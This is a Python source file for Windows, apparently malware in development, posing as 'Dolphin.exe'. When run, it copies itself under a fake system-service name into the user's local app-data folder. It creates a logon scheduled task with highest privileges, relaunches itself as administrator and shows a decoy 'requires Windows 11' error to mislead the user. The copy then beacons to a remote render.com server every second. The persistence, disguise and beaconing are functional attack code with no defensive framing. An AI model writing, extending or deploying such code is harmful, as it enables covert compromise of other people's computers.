import os
import subprocess
import sys
import multiprocessing
from pathlib import Path
import time
import shutil
import ctypes
def is_admin():
    """Returns True if the script is running with Admin privileges, False otherwise."""
    try:
        # shell32.IsUserAnAdmin() returns 1 if admin, 0 if not
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def show_windows_error(title, message):
    """Displays a native Windows error dialog box."""
    # 0x10 = MB_ICONERROR (Red 'X' icon)
    # 0x00 = MB_OK (An OK button)
    # 0x40000 = MB_TOPMOST (Forces the popup to stay on top of other windows)
    box_style = 0x10 | 0x00 | 0x40000

    ctypes.windll.user32.MessageBoxW(0, message, title, box_style)
exactname = "Dolphin.exe"
exactinjectname = "Service Host Holo.exe"

def get_exe_self_path():
    if getattr(sys, "frozen", False):
        # Running as a compiled .exe -> returns the full path to the .exe itself
        return os.path.abspath(sys.executable)
    else:
        # Running as a normal .py script -> returns the full path to the .py file
        return os.path.abspath(__file__)
    
def get_exe_name():
    return os.path.basename(get_exe_self_path())

def get_clean_exe_name():
    full_name = get_exe_name()  # Returns "MyApp.exe" or "script.py"
    name_only, extension = os.path.splitext(full_name)
    return name_only  # Returns "MyApp" or "script"


# --- Example Usage ---
exe_itself = get_exe_self_path()
exe_name = get_exe_name()


def Injector():
    print("Injecting..")
    local_app_data = os.environ.get("LOCALAPPDATA")
    target_dir = Path(local_app_data) / "ServiceHostHolo"

    target_dir.mkdir(parents=True, exist_ok=True)
    print(f"Folder ready at: {target_dir}")

    def add_exe_to_scheduler(exe, task_name):
        script_dir = os.path.dirname(os.path.abspath(__file__))

        if not os.path.exists(exe):
            print(f"Error: Could not find the executable at {exe}")
            return False

        print(f"Found executable at: {exe}")

        command = [
            "schtasks",
            "/Create",
            "/TN",
            task_name,
            "/TR",
            f'"{exe}"',
            "/SC",
            "ONLOGON",
            "/RL",
            "HIGHEST",  # <--- CRUCIAL: This forces the task to run as Administrator
            "/F",
        ]

        try:
            result = subprocess.run(
                command, capture_output=True, text=True, check=True
            )
            print("Success!")
            print(result.stdout)
            return True
        except subprocess.CalledProcessError as e:
            print("Failed to create task scheduler entry.")
            print(f"Error code: {e.returncode}")
            print(f"Details: {e.stderr}")
            return False
        
    def clone_injection(destination_folder):
        try:
            # 1. Get the path of the current running executable
            current_exe_path = get_exe_self_path()
            exe_name = os.path.basename(current_exe_path)

            # 2. Ensure the destination directory exists
            dest_dir = Path(destination_folder)
            dest_dir.mkdir(parents=True, exist_ok=True)

            # 3. Define the full destination path for the clone
            clone_destination = dest_dir / exactinjectname

            # 4. Copy the file
            # shutil.copy2 preserves file metadata (timestamps, etc.)
            shutil.copy2(current_exe_path, clone_destination)

            print(f"Successfully cloned to: {clone_destination}")
            return clone_destination

        except PermissionError:
            print(
                f"[ERROR] Permission Denied! Cannot write to {destination_folder}."
            )
            print("Make sure you are running as Administrator.")
            return None
        except Exception as e:
            print(f"[ERROR] Failed to clone: {e}")
            return None
        
    def launch_as_admin(exe_path):
        # 'runas' forces Windows to launch the file with elevated Admin privileges
        result = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", str(exe_path), None, None, 1
        )

        # ShellExecuteW returns a value greater than 32 if it succeeded
        if result > 32:
            print("Successfully launched process as Administrator.")
        else:
            print(f"Failed to launch. Windows Error Code: {result}")

    if os.path.exists(target_dir / exactinjectname):
        print("Already Injected.")
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )
        sys.exit(1)
    else:
        print(__file__)
        injectexe = clone_injection(target_dir)
        add_exe_to_scheduler(injectexe, task_name="ServiceHost")
        time.sleep(2)
        launch_as_admin(injectexe)
        print("Injection Complete.")
        time.sleep(1)
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )

def RunMain():
    import requests
    URL = "https://anotherwebsite-x1gv.onrender.com"
    print("Main running")
    while True:
        time.sleep(1)
        # Data you want to send to the server
        payload = {"message": "Hello Server! This is Ryz's PC."}
        try:
            # Send the POST request with the JSON data
            response = requests.post(URL, json=payload)

            # Check if the server responded successfully (Status 200)
            if response.status_code == 200:
                # Parse the JSON response text from the server
                server_reply = response.json()
                print("Success! Response from server:")
                print(server_reply.get("server_message"))
            else:
                print(f"Server returned an error code: {response.status_code}")

        except Exception as e:
            print(f"Failed to connect to server: {e}")

if __name__ == "__main__":
    multiprocessing.freeze_support()
    if is_admin():
        print("Running")
    else:
        print("Failure: Missing Admin rights. Showing Windows Popup.")

        # Show the native popup error window
        show_windows_error(
            title="Access Denied",
            message="This application requires Administrator privileges to run.\n\nPlease restart the application as an Administrator.",
        )

        # Exit the application immediately since we don't have permissions
        sys.exit(1)
    print(exe_name," >> ",exactname)
    if exe_name==exactname:
        print("Injecting File")
        Injector()
    elif exe_name==exactinjectname:
        RunMain()
    else:
        print("You arent a valid Filename..")
        show_windows_error(
            title="Access Denied",
            message="This application requires Windows 11 or newer to run.\n\nPlease restart the application as an Administrator.",
        )
        sys.exit(1)
    time.sleep(10)